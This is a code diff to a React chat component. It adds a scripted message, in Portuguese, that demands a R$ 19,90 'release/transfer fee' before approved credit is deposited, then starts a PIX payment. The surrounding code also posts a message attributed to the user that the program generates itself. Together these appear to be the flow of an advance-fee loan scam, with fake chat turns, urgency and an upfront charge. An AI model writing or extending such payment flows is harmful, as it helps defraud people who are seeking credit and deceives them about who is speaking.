@@ -820,7 +820,14 @@ const Chat = () => {
                       setTimeout(() => {
                         setMessages((prev) => [...prev, { id: Date.now(), text: "Documento conferido e confirmado! ✅", fromUser: true, time: getNow(), read: true }]);
                       }, 300);
-                      setTimeout(() => generatePixPayment(), 1500);
+                      setTimeout(() => {
+                        setMessages((prev) => [...prev, {
+                          id: Date.now() + 1,
+                          text: `Perfeito, ${firstName || "cliente"}! Para finalizar a liberação do seu crédito, é necessário o pagamento da Taxa de Liberação/Transferência no valor de R$ 19,90.\n\n💡 Essa taxa cobre os custos operacionais de processamento e transferência (TED/PIX) do valor aprovado para sua conta.\n\n⚡ Após a confirmação do pagamento, o valor será depositado em até 5 minutos na conta informada.`,
+                          fromUser: false, time: getNow(), read: true,
+                        }]);
+                      }, 2000);
+                      setTimeout(() => generatePixPayment(), 5000);
                     }}
                     className="w-full py-2.5 rounded-xl bg-primary text-primary-foreground font-bold text-sm hover:opacity-90 transition-opacity"
                   >
